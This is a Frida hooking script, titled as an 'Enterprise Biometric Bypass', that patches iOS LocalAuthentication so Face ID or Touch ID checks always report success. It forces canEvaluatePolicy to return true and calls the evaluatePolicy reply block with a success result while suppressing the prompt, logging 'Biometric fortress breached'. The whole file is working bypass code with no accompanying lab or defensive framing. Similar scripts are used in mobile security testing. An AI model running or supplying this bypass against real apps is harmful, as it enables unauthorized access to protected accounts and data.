/**
 * Sentinel Hook - Enterprise Biometric Bypass
 * Phase 2.1: Stealth LocalAuthentication Patch
 */

if (ObjC.available) {
    console.log("[🌟] SENTINEL SUBSYSTEM: Initiating Biometric Hook (LAContext)");

    var LAContext = ObjC.classes.LAContext;
    var targetSensorMethod = "- evaluatePolicy:localizedReason:reply:";
    var canEvaluateMethod = "- canEvaluatePolicy:error:";

    // 1. BYPASS PRE-CHECK (Hardware validation)
    try {
        Interceptor.attach(LAContext[canEvaluateMethod].implementation, {
            onLeave: function (retval) {
                console.log("[+] AUTH_PRE_CHECK: Intercepted hardware validation. Spoofing YES (1).");
                retval.replace(1);
            }
        });
    } catch(err) {
        console.log("[-] WARNING: canEvaluatePolicy hook failed - " + err.message);
    }

    // 2. BYPASS ACTUAL AUTHENTICATION
    try {
        Interceptor.attach(LAContext[targetSensorMethod].implementation, {
            onEnter: function (args) {
                console.log("[💥] SENTINEL TRIGGER: Deep-linking into LAContext verification...");
                
                var reasonMessage = new ObjC.Object(args[3]).toString();
                console.log("    -> Target Reason: " + reasonMessage);
                console.log("    -> Action: Suppressing UI Prompt. Delegating to Sentinel Core.");

                // Retain the callback block pointer
                this.replyBlock = args[4];
            },
            onLeave: function (retval) {
                if (!this.replyBlock.isNull()) {
                    var block = new ObjC.Block(this.replyBlock);
                    console.log("[🔥] INJECTION: Forcing 'SUCCESS' state into Auth Callback.");

                    try {
                        // Execute the Swift reply block with (true, nil)
                        block.implementation(1, null);
                        console.log("[✅] ACCESS GRANTED: Biometric fortress breached.");
                    } catch (e) {
                        console.log("[-] EXEC ERROR: Failed to execute block pointer - " + e.message);
                    }
                } else {
                    console.log("[-] EXEC ERROR: Reply block is NULL.");
                }
            }
        });
    } catch(err) {
        console.log("[-] WARNING: evaluatePolicy hook failed - " + err.message);
    }
} else {
    console.log("[-] FATAL: Objective-C Runtime unavailable.");
}
